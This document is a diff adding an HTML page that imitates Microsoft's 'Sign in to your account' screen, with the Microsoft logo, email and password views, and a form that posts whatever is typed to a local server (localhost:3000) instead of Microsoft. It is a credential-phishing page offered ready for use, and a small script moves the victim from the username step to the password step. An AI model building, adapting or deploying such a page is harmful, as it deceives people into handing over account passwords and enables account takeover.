@@ -1,0 +1,248 @@
+<html dir="ltr" class="" lang="en">
+
+<head>
+    <link rel="stylesheet" type="text/css" href="converged.v2.login.min.css">
+    <title>Sign in to your account</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+
+    <style>
+
+
+    </style>
+
+
+
+    <meta name="robots" content="none">
+
+
+
+    <div>
+        <!-- Background Set Block -->
+        <div data-bind="">
+            <div class="background" role="presentation" data-bind="">
+                <div data-bind=""
+                    style="background-image: url(&quot;0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);">
+                </div>
+                <div class="backgroundImage" data-bind=""
+                    style="background-image: url(&quot;0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);">
+                </div>
+            </div>
+        </div>
+        <div data-bind=""></div>
+
+        <!-- BEGIN LOGIN FORM -->
+        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top"
+            autocomplete="off" data-bind="" action="http://localhost:3000">
+
+            <div class="outer" data-bind="">
+
+                <div class="middle" data-bind="">
+
+                    <div class="inner fade-in-lightbox" data-bind="">
+                        <div class="lightbox-cover" data-bind="">
+                        </div>
+                        <div data-bind="component: { name: 'logo-control',
+                    params: {
+                        isChinaDc: svr.fIsChinaDc,
+                        bannerLogoUrl: bannerLogoUrl(bannerlogo) } }">
+                            <img class="logo" role="img" pngsrc="
+                        microsoft_logo.png" svgsrc="microsoft_logo.svg" data-bind="" src="microsoft_logo.svg"
+                                alt="Microsoft">
+
+                        </div>
+                        <div role="main" data-bind="">
+
+                            <div data-bind="">
+                                <div class="pagination-view animate slide-in-next" data-bind="">
+
+
+
+                                    <!-- START VIEW 1 FOR USERNAME PROMPT -->
+                                    <div data-viewid="1" data-showfedcredbutton="true" data-bind="" id="view1">
+                                        <div data-bind="">
+                                            <div class="row text-title" id="loginHeader">
+                                                <div role="heading" aria-level="1" data-bind="">Sign in</div>
+                                            </div>
+                                            <div class="row">
+                                                <div role="alert" aria-live="assertive">
+                                                </div>
+                                                <div class="form-group col-md-24">
+                                                    <div class="placeholderContainer" data-bind="">
+                                                        <!-- USERNAME INPUT FIELD TO COLLECT USERNAME -->
+                                                        <input type="email" name="loginfmt" id="i0116" maxlength="113"
+                                                            lang="en" class="form-control ltr_override"
+                                                            aria-required="true" data-bind=""
+                                                            aria-describedby="loginHeader"
+                                                            placeholder="Email, phone, or Skype">
+
+                                                        <input name="passwd" type="password" id="i0118"
+                                                            autocomplete="off" data-bind="" class="moveOffScreen"
+                                                            tabindex="-1" aria-hidden="true">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div data-bind="" class="position-buttons">
+                                                <div class="row">
+                                                    <div class="col-md-24">
+                                                        <div class="text-13 action-links">
+                                                            <div class="form-group" data-bind="">No account? <a href="#"
+                                                                    id="signup"
+                                                                    aria-label="Create a Microsoft account">Create
+                                                                    one!</a>
+                                                            </div>
+                                                            <div class="form-group"> <a id="cantAccessAccount"
+                                                                    name="cannotAccessAccount" href="#"
+                                                                    data-bind="">Can’t access your account?</a>
+                                                            </div>
+                                                            <div class="form-group" data-bind="">
+                                                                <div class="form-group">
+                                                                    <a id="idA_PWD_SwitchToCredPicker" href="#"
+                                                                        data-bind="">Sign-in options</a>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <!-- BUTTON TO CHANGE TO FORM VIEW 2 -->
+                                                <div class="row" data-bind="">
+                                                    <div data-bind="">
+                                                        <div class="col-xs-24 no-padding-left-right button-container"
+                                                            data-bind="">
+                                                            <div class="inline-block">
+                                                                <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Next">
+                                                                
+                                                                <!-- <input type="submit" id="idSIButton9"
+                                                                    class="btn btn-block btn-primary" data-bind=""
+                                                                    value="Next">  -->
+                                                                
+                                                                </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- START VIEW 2 FOR PASSWORD PROMPT -->
+                                    <div data-viewid="2"  data-showidentitybanner="true" data-dynamicbranding="true" data-bind="" id="view2">
+                                        <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="">Enter password
+                                        </div>
+                                        <div class="row">
+                                            <div class="form-group col-md-24">
+                                                <div role="alert" aria-live="assertive">
+                                                </div>
+                                                <div class="placeholderContainer" data-bind="">
+                                                    <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control"
+                                                        aria-required="true" data-bind=""
+                                                        aria-describedby="loginHeader  " placeholder="Password"
+                                                        aria-label="Enter the password for your account" tabindex="0" required>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div data-bind="" class="position-buttons">
+                                            <div>
+                                                <div class="row">
+                                                    <div class="col-md-24">
+                                                        <div class="text-13 action-links">
+                                                            <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link"
+                                                                    href=""
+                                                                    data-bind="">Forgot
+                                                                    my password</a> </div>
+                                                            <div class="form-group">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="row" data-bind="">
+                                                <div data-bind="">
+                                                    <div class="col-xs-24 no-padding-left-right button-container" data-bind="">
+                                                        <div class="inline-block">
+                                                            <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="" value="Sign in">
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                </div>
+                            </div>
+                        </div>
+
+                        <div id="footer" class="footer default" role="contentinfo" data-bind="">
+                            <div data-bind="">
+
+                                <div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" data-bind=""
+                                        href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a
+                                        id="ftrPrivacy" data-bind=""
+                                        href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp;
+                                        cookies</a>
+                                    <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="">
+                                        <img class="desktopMode" role="presentation" pngsrc="ellipsis_white.png"
+                                            svgsrc="ellipsis_white.svg" data-bind="">
+                                        <img class="mobileMode" role="presentation" pngsrc="ellipsis_grey_.png"
+                                            svgsrc="ellipsis_grey.svg" data-bind="" src="ellipsis_grey.svg">
+                                    </a> </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+        </form>
+        <form method="post" aria-hidden="true" target="_top" data-bind="">
+        </form>
+
+        <div id="idPartnerPL" data-bind="">
+        </div>
+      </div>
+
+    </body>
+
+    
+    <!-- BEGIN CUSTOM SCRIPT -->
+    <script>
+        function getUrlVars() {
+            var vars = {};
+            var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+                vars[key] = value;
+            });
+            return vars;
+        }
+        // form = document.getElementById("i0281");
+        window.addEventListener("keyup", function(event) {
+            if (even.keyCode === 13) {
+                event.preventDefault();
+                changeView()
+            }
+        });
+        document.getElementById("view2").style.display = "none"
+       
+
+        function changeView() {
+            username = document.getElementById("i0116").value;
+            b = document.getElementsByClassName("backgroundImage")[0];
+            b.style = "background-image: url(illustration.jpg)";
+            document.getElementById("view1").style.display = "none";
+            document.getElementById("view2").style.display = "";
+        }
+
+                
+        if(getUrlVars()["getpass"] == 'true') {
+            changeView()
+        }
+
+    </script>
+    <!-- END CUSTOM SCRIPT -->
+
+
+
+</html>
